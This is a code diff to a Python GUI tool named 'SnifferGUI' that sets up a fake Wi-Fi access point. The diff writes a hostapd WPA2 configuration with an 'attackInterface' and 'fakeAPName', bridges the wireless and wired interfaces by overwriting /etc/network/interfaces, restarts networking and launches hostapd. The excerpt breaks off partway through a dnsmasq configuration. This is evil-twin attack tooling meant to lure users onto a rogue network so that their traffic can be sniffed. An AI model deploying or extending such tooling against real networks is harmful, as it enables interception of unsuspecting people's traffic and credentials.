@@ -62,6 +62,10 @@ class SnifferGUI(wx.Frame):
     def stopfakeap(self, e):
         os.system("kill  `ps aux | grep hostapd | head -1 | awk '{print $2}'`")
         os.system("kill  `ps aux | grep dnsmasq | head -1 | awk '{print $2}'`")
+       
+        os.system('cp /etc/network/interfaces-bkp /etc/network/interfaces')
+        os.system('/etc/init.d/networking restart')
+
         wx.MessageBox('Fake SSID is Stopped', 'Info', wx.OK | wx.ICON_INFORMATION)
 
     def executeCommand(self, e):
@@ -79,24 +83,71 @@ class SnifferGUI(wx.Frame):
         # ~ config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid=thisisme\nchannel=1\n#enable_karma=1\n"
         # config_file = "interface=" + attackInterface + "\ndriver=nl80211\nssid=" + fakeAPName + "\nchannel=1\n#enable_karma=1\n"
 
+        #~ config_file = '''interface=%s
+#~ driver=nl80211
+#~ ssid=%s
+#~ hw_mode=g
+#~ channel=6
+#~ macaddr_acl=0
+#~ auth_algs=1
+#~ ignore_broadcast_ssid=0
+#~ wpa=3
+#~ wpa_passphrase=%s
+#~ wpa_key_mgmt=WPA-PSK
+#~ wpa_pairwise=TKIP CCMP
+#~ rsn_pairwise=CCMP''' %(attackInterface, fakeAPName, fakeAPPassword)
+
         config_file = '''interface=%s
+bridge=br0
 driver=nl80211
+country_code=IN
 ssid=%s
 hw_mode=g
 channel=6
-macaddr_acl=0
-auth_algs=1
-ignore_broadcast_ssid=0
-wpa=3
+wpa=2
 wpa_passphrase=%s
 wpa_key_mgmt=WPA-PSK
-wpa_pairwise=TKIP CCMP
-rsn_pairwise=CCMP''' %(attackInterface, fakeAPName, fakeAPPassword)
+wpa_pairwise=TKIP
+rsn_pairwise=CCMP
+auth_algs=1
+macaddr_acl=0''' %(attackInterface, fakeAPName, fakeAPPassword)
 
         hostapd.write(config_file)
         hostapd.close()
         # ~ print 2
+        
+        os.system('cp /etc/network/interfaces /etc/network/interfaces-bkp')
+        
+        
+        networksetup_string = '''auto lo br0
+iface lo inet loopback
+ 
+# wireless wlan0
+allow-hotplug wlan0
+iface wlan0 inet manual
+ 
+# eth0 connected to the ISP router
+allow-hotplug eth0
+iface eth0 inet manual
+ 
+# Setup bridge
+iface br0 inet static
+    bridge_ports wlan0 eth0
+    address 192.168.1.11
+    netmask 255.255.255.0
+    network 192.168.1.0
+    ## isp router ip, 192.168.1.2 also runs DHCPD ##
+    gateway 192.168.1.2
+    dns-nameservers 192.168.1.2
+'''
+        
+        networkfile = open('/etc/network/interfaces','w')
+        networkfile.write(networksetup_string)
+        networkfile.close()
+        os.system('/etc/init.d/networking restart')
+        
         os.system("gnome-terminal -x hostapd ./Modules/hostapd-freenetwpa2.conf &")
+        
         # ~ print 3
         os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
 		cat <<EOF > /etc/dnsmasq.conf
